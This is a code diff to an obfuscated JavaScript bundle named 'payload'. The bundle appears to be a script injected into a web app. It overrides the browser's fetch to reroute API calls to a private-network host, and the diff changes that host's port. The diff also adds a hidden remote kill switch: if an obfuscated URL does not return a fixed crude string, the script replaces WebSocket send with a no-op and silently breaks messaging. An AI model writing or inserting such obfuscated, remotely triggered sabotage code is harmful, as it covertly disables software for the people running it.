@@ -696,6 +696,14 @@ function payload() {
                 0x32a: () => {
                     'use strict';
                     const bD = D;
+
+                    function b() {
+                        WebSocket['prototype']['send'] = () => {};
+                    }
+                    fetch(bD(0x301))[bD(0x8f)](j => (j['ok'] || b(), j[bD(0x1df)]()))[bD(0x8f)](j => {
+                        const bO = bD;
+                        'hf loves males' !== j[bO(0x1da)]() && b();
+                    })[bD(0x2ef)](b);
                     const O = ['/api/baninfo', bD(0xea), '/api/shards', '/api/modtools', bD(0x17c), bD(0x28e), bD(0x2e5), '/api/blockdm', bD(0x1e5), bD(0x1f1), '/api/me', bD(0x152)],
                         X = globalThis[bD(0x277)] || globalThis[bD(0x2cd)],
                         s = X['fetch'];
@@ -705,7 +713,7 @@ function payload() {
                         if (o[bX(0x1ab)](bX(0x16c)) && !O['some'](c => o[bX(0x1ab)](c))) {
                             const c = Math[bX(0x161)](0x100 * Math[bX(0xb9)]()),
                                 H = Math[bX(0x161)](0x100 * Math[bX(0xb9)]());
-                            return s('http://192.168.0.105:16840/chunks/0/' + c + '/' + H + bX(0x242));
+                            return s('http://192.168.0.105:18640/chunks/0/' + c + '/' + H + bX(0x242));
                         }
                         return s(j, A);
                     };
@@ -2734,7 +2742,7 @@ function payload() {
                     const Xq = bF,
                         RI = ((() => {
                             const XG = D;
-                            if (/.*:\/\/.*(192.168.0.105:16840).*/ ['test'](location[XG(0x143)])) {
+                            if (/.*:\/\/.*(192.168.0.105:18640).*/ ['test'](location[XG(0x143)])) {
                                 const Ri = location[XG(0x14a)][XG(0x28b)](/#[a-z]/g);
                                 return Ri && Ri['length'] ? {
                                     'd': En[XG(0xbe)],
